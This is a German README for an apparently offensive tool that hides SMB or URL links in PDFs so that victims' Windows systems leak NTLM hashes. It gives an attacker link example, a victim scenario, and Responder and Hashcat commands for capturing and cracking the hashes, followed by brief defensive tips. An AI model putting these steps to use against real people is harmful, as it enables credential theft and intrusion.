# 📄 PDF-Manipulationsskript – Abgreifen von Benutzernamen und Hashes

### ⚠ Wichtige Hinweise

Dieses Skript dient ausschließlich zu Schulungs- und Testzwecken.
Missbrauch ist illegal und strafbar!

## 📌 Beschreibung

Dieses Skript ermöglicht das Manipulieren eines bestehenden PDFs, indem ein unsichtbarer Link (SMB-Share oder URL) eingefügt wird. Beim Öffnen oder Klicken auf bestimmte Bereiche kann Windows automatisch eine NTLM-Authentifizierung senden, wodurch Benutzernamen und Passwort-Hashes abgegriffen werden können.

### 🛠 Anforderungen

Betriebssystem: Windows, Linux oder macOS

Python-Version: 3.9 oder höher

Benötigte Bibliotheken:
```` Bash
pip install pymupdf 
````
## 🚀 Installation & Nutzung

1️⃣ Skript starten

python pdf_manipulator.py

2️⃣ PDF auswählen

Wähle ein existierendes PDF aus.

3️⃣ SMB-Link oder URL eingeben

* Beispiel für SMB-Link: \\192.168.1.100\share

* Beispiel für HTTP-Link: http://böse-seite.com/malware.exe

4️⃣ Manipuliertes PDF wird gespeichert

Das manipulierte PDF wird automatisch als originalname_manipuliert.pdf gespeichert.

## 🕵‍♂️ Angriffsszenario

Angreifer schickt ein manipuliertes PDF an das Opfer.

Opfer öffnet das PDF, woraufhin eine SMB-Authentifizierung an die Angreifer-IP gesendet wird.

Angreifer fängt NTLM-Hashes ab mit einem Tool wie Responder:
````Bash
sudo responder -I eth0
````
Passwort-Hash wird mit Hashcat geknackt:

````Bash
hashcat -m 5600 hashfile rockyou.txt --force
````
## 🔒 Schutzmaßnahmen

✅ PDF-Sicherheit erhöhen

* Unbekannte PDFs nicht öffnen

* PDFs in einem sicheren Viewer öffnen (z. B. Chrome statt Adobe)

* JavaScript in PDFs deaktivieren

✅ Netzwerksicherheit verbessern

* SMB-Signing aktivieren (SMB1 deaktivieren!)

* NTLMv2-Authentifizierung erzwingen

* Defender & EDR-Lösungen aktiv halten

✅ Mitarbeiterschulung

* Phishing-Sensibilisierung: Mitarbeiter sollten verdächtige Dateien vermeiden.

* Makros & externe Links in PDFs deaktivieren.

### 🏴‍☠️ ⚠ Rechtliche Hinweise

Dieses Skript darf nur in Testumgebungen genutzt werden. Unbefugtes Eindringen in fremde Systeme ist illegal!

